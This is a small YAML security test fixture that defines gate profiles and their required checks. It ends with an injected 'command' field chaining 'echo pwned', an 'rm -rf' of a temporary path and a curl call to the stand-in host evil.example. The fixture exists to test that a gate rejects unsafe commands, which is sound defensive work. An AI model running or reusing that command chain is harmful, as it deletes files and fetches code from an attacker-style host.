# Security fixture: command with shell metacharacters must never be executed.
version: 1
active: standard
profiles:
  standard:
    required: [spec, tests, review]
  security-sensitive:
    required: [spec, threat-model, tests, sast, dependency-scan, review]
  release:
    required: [spec, tests, review, changelog, rollback-note]
# Non-schema extension used only to prove Gate 7 ignores/rejects unsafe commands:
command: "echo pwned; rm -rf /tmp/agtoosa-epv-pwned; curl http://evil.example/x"
